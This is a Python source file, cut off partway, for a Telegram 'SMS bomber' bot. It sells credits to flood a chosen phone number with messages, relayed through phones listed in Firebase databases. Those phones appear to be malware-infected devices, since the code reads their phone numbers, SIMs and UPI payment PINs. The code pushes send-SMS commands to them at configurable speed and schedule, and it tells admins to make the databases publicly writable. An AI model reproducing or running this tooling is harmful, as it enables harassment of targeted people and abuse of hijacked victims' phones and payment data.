#!/usr/bin/env python3
"""
Premium Xipher Bomber Bot - FINAL PRODUCTION VERSION
Uses environment variables for secrets (safe for GitHub).
Reads BOT_TOKEN, ADMIN_IDS, OWNER from .env or system env.
"""

import asyncio
import json
import logging
import os
# Render worker trick — bind a dummy port so Render doesn't complain
if os.environ.get("PORT"):
    import threading
    from http.server import HTTPServer, BaseHTTPRequestHandler
    class _Ping(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
        def log_message(self, *args):
            pass
    def _run():
        HTTPServer(("0.0.0.0", int(os.environ["PORT"])), _Ping).serve_forever()
    threading.Thread(target=_run, daemon=True).start()
import sqlite3
import sys
import random
import string
from datetime import datetime
from typing import Dict, List, Tuple
from urllib.parse import urlparse
from uuid import uuid4

import httpx
from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
)
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    MessageHandler,
    filters,
    ContextTypes,
)
from telegram.constants import ParseMode
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from apscheduler.triggers.date import DateTrigger

# Load .env if present (dev use)
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

# ==========================================================
# ---------- CONFIG (from ENV) ----------
# ==========================================================
TOKEN = os.environ.get("BOT_TOKEN", "").strip()
_admin_ids_raw = os.environ.get("ADMIN_IDS", "").strip()
ADMIN_IDS = [int(x.strip()) for x in _admin_ids_raw.split(",") if x.strip().isdigit()]
OWNER = os.environ.get("OWNER", "@YourUsername").strip()

FORCE_CHANNELS = tuple(
    ch.strip()
    for ch in os.environ.get("FORCE_CHANNELS", "").split(",")
    if ch.strip()
)

MAX_CONCURRENT_REQUESTS = int(os.environ.get("MAX_CONCURRENT_REQUESTS", "100"))
DB_PATH = os.environ.get("DB_PATH", "bomber.db")

# ---------- VALIDATION ----------
if not TOKEN:
    print("❌ ERROR: BOT_TOKEN environment variable not set.")
    print("   Set it with: export BOT_TOKEN='your_token_here'")
    sys.exit(1)

if not ADMIN_IDS:
    print("⚠️  WARNING: ADMIN_IDS is empty. No one will be admin.")

# ==========================================================
# ---------- LOGGING ----------
# ==========================================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO,
)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("apscheduler").setLevel(logging.WARNING)
logging.getLogger("telegram.ext.Application").setLevel(logging.WARNING)
logger = logging.getLogger(__name__)


# ==========================================================
# ---------- MARKDOWN SAFETY ----------
# ==========================================================
def escape_md(text: str) -> str:
    escape_chars = r"_*`["
    return "".join(f"\\{c}" if c in escape_chars else c for c in str(text))


# ==========================================================
# ---------- ASYNC HTTP CLIENT ----------
# ==========================================================
_http_client = None
_http_semaphore = None


def get_http_client() -> httpx.AsyncClient:
    global _http_client
    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(
            timeout=httpx.Timeout(15.0, connect=8.0),
            limits=httpx.Limits(max_connections=200, max_keepalive_connections=100),
        )
    return _http_client


def get_http_semaphore() -> asyncio.Semaphore:
    global _http_semaphore
    if _http_semaphore is None:
        _http_semaphore = asyncio.Semaphore(MAX_CONCURRENT_REQUESTS)
    return _http_semaphore


async def check_channel_membership(user_id: int, bot) -> Tuple[bool, List[str]]:
    if not FORCE_CHANNELS:
        return (True, [])
    missing = []
    for channel in FORCE_CHANNELS:
        try:
            member = await bot.get_chat_member(channel, user_id)
            if member.status in ["left", "kicked"]:
                missing.append(channel)
        except Exception:
            missing.append(channel)
    return (len(missing) == 0, missing)


def get_join_keyboard() -> InlineKeyboardMarkup:
    buttons = []
    for ch in FORCE_CHANNELS:
        buttons.append(
            [InlineKeyboardButton(f"🔗 Join {ch}", url=f"https://t.me/{ch.lstrip('@')}")]
        )
    buttons.append([InlineKeyboardButton("✅ I've Joined", callback_data="check_join")])
    return InlineKeyboardMarkup(buttons)


# ==========================================================
# ---------- DATABASE ----------
# ==========================================================
def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=10.0)
    conn.execute("PRAGMA busy_timeout=5000")
    return conn


def init_db():
    conn = _connect()
    c = conn.cursor()
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    c.execute("""
        CREATE TABLE IF NOT EXISTS firebases (
            id TEXT PRIMARY KEY,
            url TEXT NOT NULL,
            secret TEXT NOT NULL,
            added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS jobs (
            id TEXT PRIMARY KEY,
            target TEXT NOT NULL,
            message TEXT NOT NULL,
            devices_used INTEGER,
            success_count INTEGER,
            fail_count INTEGER,
            status TEXT,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            scheduled_for TIMESTAMP,
            started_at TIMESTAMP,
            finished_at TIMESTAMP,
            firebase_ids TEXT,
            chat_id INTEGER,
            total_sms INTEGER,
            delay REAL,
            credit_used INTEGER,
            user_id INTEGER
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY,
            value TEXT
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            credits INTEGER DEFAULT 0
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS keys (
            key_string TEXT PRIMARY KEY,
            credits INTEGER NOT NULL,
            max_uses INTEGER NOT NULL,
            used_count INTEGER DEFAULT 0,
            created_by INTEGER,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    c.execute("""
        CREATE TABLE IF NOT EXISTS redemptions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            key_string TEXT,
            user_id INTEGER,
            redeemed_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY(key_string) REFERENCES keys(key_string),
            FOREIGN KEY(user_id) REFERENCES users(user_id)
        )
    """)

    c.execute("PRAGMA table_info(jobs)")
    columns = [row[1] for row in c.fetchall()]
    if "total_sms" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN total_sms INTEGER")
    if "delay" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN delay REAL")
    if "credit_used" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN credit_used INTEGER")
    if "user_id" not in columns:
        c.execute("ALTER TABLE jobs ADD COLUMN user_id INTEGER")

    conn.commit()
    conn.close()


init_db()


# ==========================================================
# ---------- DB HELPERS ----------
# ==========================================================
def db_get_firebases() -> Dict[str, Dict]:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT id, url, secret FROM firebases")
    rows = c.fetchall()
    conn.close()
    return {row[0]: {"url": row[1], "secret": row[2]} for row in rows}


def db_add_firebase(fid: str, url: str, secret: str = ""):
    conn = _connect()
    c = conn.cursor()
    c.execute(
        "INSERT OR REPLACE INTO firebases (id, url, secret) VALUES (?,?,?)",
        (fid, url, secret),
    )
    conn.commit()
    conn.close()


def db_delete_firebase(fid: str):
    conn = _connect()
    c = conn.cursor()
    c.execute("DELETE FROM firebases WHERE id=?", (fid,))
    conn.commit()
    conn.close()


def db_add_job(job_id: str, target: str, message: str, firebase_ids: List[str],
               chat_id: int, total_sms: int, delay: float, user_id: int) -> str:
    conn = _connect()
    c = conn.cursor()
    c.execute(
        "INSERT INTO jobs (id, target, message, status, firebase_ids, chat_id, total_sms, delay, user_id) "
        "VALUES (?,?,?,?,?,?,?,?,?)",
        (job_id, target, message, "pending", ",".join(firebase_ids), chat_id,
         total_sms, delay, user_id),
    )
    conn.commit()
    conn.close()
    return job_id


def db_update_job(job_id: str, **kwargs):
    conn = _connect()
    c = conn.cursor()
    fields = []
    vals = []
    for k, v in kwargs.items():
        fields.append(f"{k}=?")
        vals.append(v)
    vals.append(job_id)
    c.execute(f"UPDATE jobs SET {','.join(fields)} WHERE id=?", vals)
    conn.commit()
    conn.close()


def db_get_jobs(limit=20, user_id=None) -> List[Dict]:
    conn = _connect()
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    if user_id is not None:
        c.execute(
            "SELECT * FROM jobs WHERE user_id = ? ORDER BY created_at DESC LIMIT ?",
            (user_id, limit),
        )
    else:
        c.execute("SELECT * FROM jobs ORDER BY created_at DESC LIMIT ?", (limit,))
    rows = c.fetchall()
    conn.close()
    return [dict(row) for row in rows]


def get_user_credits(user_id: int) -> int:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if row:
        conn.close()
        return row[0]
    c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, 0))
    conn.commit()
    conn.close()
    return 0


def update_user_credits(user_id: int, delta: int):
    conn = _connect()
    c = conn.cursor()
    c.execute(
        "UPDATE users SET credits = credits + ? WHERE user_id=?", (delta, user_id)
    )
    conn.commit()
    conn.close()


def deduct_credits(user_id: int, amount: int) -> bool:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if not row:
        c.execute("INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, 0))
        conn.commit()
        c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
        row = c.fetchone()
    if row[0] >= amount:
        c.execute(
            "UPDATE users SET credits = credits - ? WHERE user_id=?",
            (amount, user_id),
        )
        conn.commit()
        conn.close()
        return True
    conn.close()
    return False


def generate_key_string(length=12):
    return "".join(random.choices(string.ascii_uppercase + string.digits, k=length))


def db_add_key(key_string: str, credits: int, max_uses: int, created_by: int):
    conn = _connect()
    c = conn.cursor()
    c.execute(
        "INSERT INTO keys (key_string, credits, max_uses, created_by) VALUES (?,?,?,?)",
        (key_string, credits, max_uses, created_by),
    )
    conn.commit()
    conn.close()


def db_redeem_key(key_string: str, user_id: int) -> bool:
    conn = _connect()
    c = conn.cursor()
    c.execute(
        "SELECT credits, max_uses, used_count FROM keys WHERE key_string=?",
        (key_string,),
    )
    row = c.fetchone()
    if not row:
        conn.close()
        return False
    credits, max_uses, used_count = row
    if used_count >= max_uses:
        conn.close()
        return False
    c.execute(
        "SELECT 1 FROM redemptions WHERE key_string=? AND user_id=?",
        (key_string, user_id),
    )
    if c.fetchone():
        conn.close()
        return False
    c.execute(
        "UPDATE keys SET used_count = used_count + 1 WHERE key_string=?",
        (key_string,),
    )
    c.execute(
        "UPDATE users SET credits = credits + ? WHERE user_id=?",
        (credits, user_id),
    )
    if c.rowcount == 0:
        c.execute(
            "INSERT INTO users (user_id, credits) VALUES (?,?)", (user_id, credits)
        )
    c.execute(
        "INSERT INTO redemptions (key_string, user_id) VALUES (?,?)",
        (key_string, user_id),
    )
    conn.commit()
    conn.close()
    return True


# ==========================================================
# ---------- FIREBASE HELPERS ----------
# ==========================================================
async def firebase_request(url: str, method: str = "GET", payload: dict = None):
    raw = url.rstrip("/")
    query = ""
    if "?" in raw:
        raw, query = raw.split("?", 1)
    if raw.endswith(".json"):
        raw = raw[:-5]
    raw = raw.rstrip("/")
    parsed = urlparse(raw)
    if parsed.path:
        full_url = f"{raw}.json"
    else:
        full_url = f"{raw}/.json"
    if query:
        full_url += f"?{query}"
    client = get_http_client()
    try:
        async with get_http_semaphore():
            if method == "GET":
                resp = await client.get(full_url)
            elif method == "PUT":
                resp = await client.put(full_url, json=payload)
            elif method == "POST":
                resp = await client.post(full_url, json=payload)
            elif method == "DELETE":
                resp = await client.delete(full_url)
            else:
                raise ValueError("Unsupported method")
            resp.raise_for_status()
            try:
                return resp.json()
            except json.JSONDecodeError:
                return {"_raw": resp.text}
    except httpx.HTTPStatusError as e:
        status = e.response.status_code
        try:
            err_data = e.response.json() if e.response is not None else {}
        except Exception:
            err_data = {"error": str(e)}
        return {"_error": True, "status": status, "message": err_data.get("error", str(e))}
    except httpx.ConnectError:
        return {"_error": True, "status": 0, "message": "Connection failed. Check the URL."}
    except httpx.TimeoutException:
        return {"_error": True, "status": 0, "message": "Request timed out."}
    except Exception as e:
        return {"_error": True, "status": 0, "message": str(e)}


async def get_online_devices(url: str) -> List[Dict]:
    base = url.rstrip("/")
    if base.endswith(".json"):
        base = base[:-5]
    base = base.rstrip("/")
    clients_url = f"{base}/clients.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().get(clients_url)
            resp.raise_for_status()
            clients = resp.json()
    except Exception:
        return []
    if not isinstance(clients, dict):
        return []
    online = []
    for device_id, info in clients.items():
        if info.get("status") is True:
            online.append(
                {
                    "id": device_id,
                    "name": info.get("modelName", device_id),
                    "phone": info.get("mobNo", "N/A"),
                    "battery": info.get("battery", "N/A"),
                    "provider": info.get("service_provider", ""),
                    "sims": info.get("sims", []),
                    "upipin": info.get("upipin", ""),
                }
            )
    return online


async def send_sms_via_device(url: str, device_id: str, sim_index: int,
                              target: str, message: str) -> bool:
    payload = {
        "from": sim_index,
        "to": target,
        "message": message,
        "isSended": False,
        "timestamp": datetime.now().isoformat(),
    }
    path = f"clients/{device_id}/webhookEvent/sendSms"
    put_url = f"{url.rstrip('/')}/{path}.json"
    try:
        async with get_http_semaphore():
            resp = await get_http_client().put(put_url, json=payload)
            resp.raise_for_status()
        return True
    except Exception:
        return False


# ==========================================================
# ---------- GLOBALS ----------
# ==========================================================
running_jobs = {}
progress_messages = {}
BOT = None
LINE = "━━━━━━━━━━━━━━━━━━━━━━━━━"


def set_bot(bot):
    global BOT
    BOT = bot


# ==========================================================
# ---------- BOMB ENGINE ----------
# ==========================================================
async def execute_bomb_job(job_id, target, message, firebase_ids,
                           total_sms, delay, user_id, schedule_time=None):
    if schedule_time and schedule_time > datetime.now():
        scheduler = AsyncIOScheduler()
        scheduler.add_job(
            execute_bomb_job,
            trigger=DateTrigger(run_date=schedule_time),
            args=[job_id, target, message, firebase_ids, total_sms, delay, user_id, None],
            id=job_id,
            replace_existing=True,
        )
        scheduler.start()
        db_update_job(job_id, status="scheduled", scheduled_for=schedule_time.isoformat())
        return

    db_update_job(job_id, status="running", started_at=datetime.now().isoformat())

    if not deduct_credits(user_id, total_sms):
        db_update_job(job_id, status="failed",
                      finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0,
                                   finished=True, error="Insufficient credits")
        return

    all_devices = []
    firebases = db_get_firebases()
    used_ids = [fid for fid in firebase_ids if fid in firebases]
    for fid in used_ids:
        data = firebases[fid]
        url = data["url"]
        devices = await get_online_devices(url)
        for dev in devices:
            all_devices.append((fid, dev, url))

    if not all_devices:
        update_user_credits(user_id, total_sms)
        db_update_job(job_id, status="failed",
                      finished_at=datetime.now().isoformat(),
                      devices_used=0, success_count=0, fail_count=0, credit_used=0)
        await send_progress_update(job_id, 0, total=total_sms, success=0, fail=0,
                                   finished=True, error="No online devices")
        return

    num_devices = len(all_devices)
    sms_per_device = total_sms // num_devices
    remainder = total_sms % num_devices
    assignments = []
    for i, (fid, dev, url) in enumerate(all_devices):
        count = sms_per_device + (1 if i < remainder else 0)
        if count > 0:
            assignments.append((fid, dev, url, count))

    total_attempts = sum(c for _, _, _, c in assignments)
    success = 0
    fail = 0
    await send_progress_update(job_id, 0, total=total_attempts, success=0, fail=0)

    idx = 0
    for fid, dev, url, count in assignments:
        sims = dev.get("sims", [])
        sim_index = 1 if sims else 1
        for _ in range(count):
            ok = await send_sms_via_device(url, dev["id"], sim_index, target, message)
            if ok:
                success += 1
            else:
                fail += 1
            idx += 1
            await send_progress_update(job_id, idx, total=total_attempts,
                                       success=success, fail=fail)
            await asyncio.sleep(delay)

    if fail > 0:
        update_user_credits(user_id, fail)

    db_update_job(job_id, status="completed",
                  finished_at=datetime.now().isoformat(),
                  devices_used=num_devices, success_count=success,
                  fail_count=fail, credit_used=success)
    await send_progress_update(job_id, total_attempts, total=total_attempts,
                               success=success, fail=fail, finished=True)
    running_jobs.pop(job_id, None)
    progress_messages.pop(job_id, None)


async def send_progress_update(job_id, done, total, success, fail,
                               finished=False, error=None):
    if BOT is None:
        return
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT chat_id, target, user_id FROM jobs WHERE id=?", (job_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        return
    chat_id, target, user_id = row
    credits = get_user_credits(user_id) if user_id else 0

    percent = 0 if total == 0 else int((done / total) * 100)
    filled = int(20 * percent / 100)
    bar = "▰" * filled + "▱" * (20 - filled)

    if error:
        status_text = f"❌ *Error:* {escape_md(error)}"
    elif finished:
        status_text = "✅ *Completed*"
    else:
        status_text = "🔄 *Running*"

    text = (
        f"{LINE}\n"
        f"💣 *Xipher Bomb* | Job: `{job_id}`\n"
        f"{LINE}\n\n"
        f"{bar}  *{percent}%*\n\n"
        f"📞 Target: `{escape_md(target)}`\n"
        f"✅ Sent: {success}   ❌ Failed: {fail}\n"
        f"💳 Credits: {credits}\n\n"
        f"📌 Status: {status_text}"
    )

    if job_id in progress_messages:
        try:
            await BOT.edit_message_text(
                text, chat_id=chat_id, message_id=progress_messages[job_id],
                parse_mode=ParseMode.MARKDOWN)
        except Exception:
            pass
    else:
        try:
            msg = await BOT.send_message(chat_id, text, parse_mode=ParseMode.MARKDOWN)
            progress_messages[job_id] = msg.message_id
        except Exception:
            pass


# ==========================================================
# ---------- CONVERSATION STATES ----------
# ==========================================================
(TARGET, MESSAGE, SMS_COUNT, SPEED, SCHEDULE) = range(5)

USER_BUTTONS = ["💣 Launch Bomb", "💰 Balance", "📊 Status", "📜 History", "🔑 Redeem Key"]
ADMIN_BUTTONS = ["📡 Online Devices", "📊 Stats & History", "⚙️ Manage Firebases", "🔑 Generate Key"]
ALL_BUTTONS = USER_BUTTONS + ADMIN_BUTTONS


# ==========================================================
# ---------- MAIN MENU ----------
# ==========================================================
def get_main_keyboard(user_id):
    if user_id in ADMIN_IDS:
        keyboard = [
            ["💣 Launch Bomb", "💰 Balance"],
            ["📊 Status", "📜 History"],
            ["🔑 Redeem Key"],
            ["📡 Online Devices", "📊 Stats & History"],
            ["⚙️ Manage Firebases", "🔑 Generate Key"],
        ]
    else:
        keyboard = [
            ["💣 Launch Bomb", "💰 Balance"],
            ["📊 Status", "📜 History"],
            ["🔑 Redeem Key"],
        ]
    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)


# ==========================================================
# ---------- COMMANDS ----------
# ==========================================================
async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("🏓 Pong! ⚡ *Bot is online.*",
                                    parse_mode=ParseMode.MARKDOWN)


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    get_user_credits(user_id)

    joined, missing = await check_channel_membership(user_id, context.bot)
    if not joined:
        missing_lines = "\n".join(f"• {escape_md(ch)}" for ch in missing)
        text = (
            "╔══════════════════════════════════╗\n"
            "     🔥 *PREMIUM XIPHER BOMBER* 🔥\n"
            "╚══════════════════════════════════╝\n\n"
            "⚠️ *Please join all channels to use this bot:*\n\n"
            f"{missing_lines}\n\n"
            f"👑 *Owner:* {escape_md(OWNER)}\n\n"
            "Join and click ✅ I've Joined:"
        )
        await update.message.reply_text(text, reply_markup=get_join_keyboard(),
                                        parse_mode=ParseMode.MARKDOWN)
        return

    credits = get_user_credits(user_id)
    role = "👑 *ADMIN*" if user_id in ADMIN_IDS else "⚡ *USER*"
    text = (
        "╔══════════════════════════════════╗\n"
        "     🔥 *PREMIUM XIPHER BOMBER* 🔥\n"
        "╚══════════════════════════════════╝\n\n"
        f"👤 *User ID:* `{user_id}`\n"
        f"💎 *Credits:* {credits}\n"
        f"🎖️ *Role:* {role}\n"
        f"👑 *Owner:* {escape_md(OWNER)}\n\n"
        f"{LINE}\n"
        "🚀 *Server:* Ultra-Fast Async\n"
        "⚡ *Multi-User:* Unlimited\n"
        "🛡️ *Status:* ✅ Online\n"
        f"{LINE}\n\n"
        "👇 Use the buttons below ✨"
    )
    await update.message.reply_text(text, reply_markup=get_main_keyboard(user_id),
                                    parse_mode=ParseMode.MARKDOWN)


async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    credits = get_user_credits(user_id)
    await update.message.reply_text(
        f"💎 *PREMIUM VAULT*\n{LINE}\n💳 Balance: *{credits}* credits\n{LINE}\n"
        "💡 1 SMS = 1 credit.",
        parse_mode=ParseMode.MARKDOWN)


async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /redeem <key>")
        return
    key = args[0].strip()
    if db_redeem_key(key, user_id):
        credits = get_user_credits(user_id)
        await update.message.reply_text(
            f"✅ Key redeemed! You now have *{credits}* credits.",
            parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text("❌ Invalid key, already used, or expired.")


async def addkey_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addkey <credits> <max_uses>")
        return
    try:
        credits = int(args[0]); max_uses = int(args[1])
        if credits <= 0 or max_uses <= 0:
            raise ValueError
    except Exception:
        await update.message.reply_text("❌ Provide positive integers.")
        return
    key_string = generate_key_string()
    db_add_key(key_string, credits, max_uses, user_id)
    await update.message.reply_text(
        f"🔑 *KEY GENERATED*\n{LINE}\n🎟️ Key: `{key_string}`\n"
        f"💳 Credits: {credits}\n♻️ Max uses: {max_uses}\n"
        f"👑 Owner: {escape_md(OWNER)}\n{LINE}",
        parse_mode=ParseMode.MARKDOWN)


async def addcredits_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 2:
        await update.message.reply_text("Usage: /addcredits <user_id> <amount>")
        return
    try:
        target_user = int(args[0]); amount = int(args[1])
        if amount <= 0:
            raise ValueError
    except Exception:
        await update.message.reply_text("❌ Invalid user_id or amount.")
        return
    update_user_credits(target_user, amount)
    await update.message.reply_text(f"✅ Added {amount} credits to {target_user}.")


async def history_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    jobs = db_get_jobs(limit=10, user_id=user_id)
    if not jobs:
        await update.message.reply_text("📜 No jobs found yet.")
        return
    text = "📜 *PREMIUM HISTORY*\n" + f"{LINE}\n\n"
    for j in jobs:
        e = {"pending": "⏳", "running": "🔄", "completed": "✅", "failed": "❌",
             "cancelled": "🚫", "scheduled": "⏰"}.get(j["status"], "❓")
        text += f"{e} `{j['id']}` → {escape_md(j['target'])} *({j['status']})*\n"
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)


async def cancel_job_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Usage: /cancel <job_id>")
        return
    job_id = args[0]
    if job_id in running_jobs:
        running_jobs[job_id].cancel()
        del running_jobs[job_id]
        db_update_job(job_id, status="cancelled", finished_at=datetime.now().isoformat())
        await update.message.reply_text(f"✅ Job {job_id} cancelled.")
    else:
        await update.message.reply_text(f"Job {job_id} not running.")


async def add_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /addfb <url>")
        return
    url = args[0].strip()
    if not url.startswith("http"):
        await update.message.reply_text("❌ Invalid URL.")
        return
    test = await firebase_request(url + "?shallow=true", "GET")
    if isinstance(test, dict) and test.get("_error"):
        status = test.get("status", 0)
        msg = test.get("message", "Unknown error")
        if status == 401:
            await update.message.reply_text(
                "❌ Auth Error (401). Enable public rules:\n"
                "`{ \"rules\": { \".read\": true, \".write\": true } }`")
        elif status == 403:
            await update.message.reply_text("❌ Permission Denied (403).")
        else:
            await update.message.reply_text(
                f"❌ Connection failed (HTTP {status}).\nError: {escape_md(msg)}")
        return
    fid = str(len(db_get_firebases()) + 1)
    db_add_firebase(fid, url, "")
    await update.message.reply_text(f"✅ Firebase added with ID `{fid}`.\nURL: {escape_md(url)}")


async def delete_firebase_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    args = context.args
    if len(args) < 1:
        await update.message.reply_text("Usage: /deletefb <id>")
        return
    fid = args[0].strip()
    if fid not in db_get_firebases():
        await update.message.reply_text(f"❌ Firebase {fid} not found.")
        return
    db_delete_firebase(fid)
    await update.message.reply_text(f"✅ Firebase {fid} deleted.")


async def broadcast_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Unauthorized.")
        return
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT user_id FROM users")
    rows = c.fetchall()
    conn.close()
    user_ids = [row[0] for row in rows]
    if not user_ids:
        await update.message.reply_text("No users found.")
        return
    photo = None; caption = None
    if update.message.photo:
        photo = update.message.photo[-1].file_id
        caption = update.message.caption or ""
    else:
        if context.args:
            caption = " ".join(context.args)
        else:
            await update.message.reply_text("Usage: /broadcast <message> or photo+caption")
            return
    if not caption and not photo:
        await update.message.reply_text("Provide message or photo.")
        return
    caption_escaped = escape_md(caption) if caption else ""
    sent = 0; fail = 0
    for uid in user_ids:
        try:
            if photo:
                await BOT.send_photo(chat_id=uid, photo=photo, caption=caption_escaped,
                                     parse_mode=ParseMode.MARKDOWN)
            else:
                await BOT.send_message(chat_id=uid, text=caption_escaped,
                                       parse_mode=ParseMode.MARKDOWN)
            sent += 1
            await asyncio.sleep(0.05)
        except Exception as e:
            logger.error(f"Broadcast to {uid} failed: {e}")
            fail += 1
    await update.message.reply_text(
        f"📢 Broadcast sent!\n✅ Delivered: {sent}\n❌ Failed: {fail}\n"
        f"👑 Owner: {escape_md(OWNER)}")


# ==========================================================
# ---------- BOMB WIZARD ----------
# ==========================================================
async def bomb_wizard_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prompt = (
        "💣 *LAUNCH BOMB*\n"
        f"{LINE}\n"
        "📞 Enter the target phone number (with country code):\n"
        "Type /cancel to abort."
    )
    if update.callback_query:
        await update.callback_query.answer()
        await update.callback_query.message.reply_text(prompt, parse_mode=ParseMode.MARKDOWN)
    else:
        await update.message.reply_text(prompt, parse_mode=ParseMode.MARKDOWN)
    return TARGET


async def bomb_target(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    if not text.isdigit():
        await update.message.reply_text("❌ Enter a valid numeric phone number.")
        return TARGET
    context.user_data["target"] = text
    await update.message.reply_text("✏️ Enter the message:")
    return MESSAGE


async def bomb_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    context.user_data["message"] = text
    credits = get_user_credits(update.effective_user.id)
    await update.message.reply_text(
        f"📨 How many SMS? (You have *{credits}* credits, 1 SMS = 1 credit)\n"
        "Enter a number:", parse_mode=ParseMode.MARKDOWN)
    return SMS_COUNT


async def bomb_sms_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    try:
        count = int(text)
        if count <= 0:
            raise ValueError
    except Exception:
        await update.message.reply_text("❌ Enter a positive integer.")
        return SMS_COUNT
    credits = get_user_credits(update.effective_user.id)
    if count > credits:
        await update.message.reply_text(
            f"⚠️ Only {credits} credits. Enter up to {credits} or /cancel.")
        return SMS_COUNT
    context.user_data["sms_count"] = count
    keyboard = [
        [InlineKeyboardButton("🐢 Slow (1s)", callback_data="speed_slow")],
        [InlineKeyboardButton("🐇 Medium (0.5s)", callback_data="speed_medium")],
        [InlineKeyboardButton("🚀 Fast (0.1s)", callback_data="speed_fast")],
        [InlineKeyboardButton("💥 Lightning (0.02s)", callback_data="speed_lightning")],
    ]
    await update.message.reply_text(
        "⚡ *SELECT SPEED*\n" + f"{LINE}\n" + "Choose:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode=ParseMode.MARKDOWN)
    return SPEED


async def bomb_speed(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    delay = {"speed_slow": 1.0, "speed_medium": 0.5, "speed_fast": 0.1,
             "speed_lightning": 0.02}.get(query.data, 0.5)
    context.user_data["delay"] = delay
    await query.message.reply_text(
        f"⏱️ Delay: *{delay}s*\n\n"
        "🕒 Schedule? Send `YYYY-MM-DD HH:MM` or 'now':",
        parse_mode=ParseMode.MARKDOWN)
    return SCHEDULE


async def bomb_schedule(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip().lower()
    if text in ALL_BUTTONS:
        context.user_data.clear()
        await button_handler(update, context)
        return ConversationHandler.END
    try:
        if text == "now":
            schedule_time = None
        else:
            try:
                schedule_time = datetime.strptime(text, "%Y-%m-%d %H:%M")
                if schedule_time <= datetime.now():
                    await update.message.reply_text("⚠️ Future time only. Retry.")
                    return SCHEDULE
            except ValueError:
                await update.message.reply_text("❌ Use `YYYY-MM-DD HH:MM` or 'now'.")
                return SCHEDULE

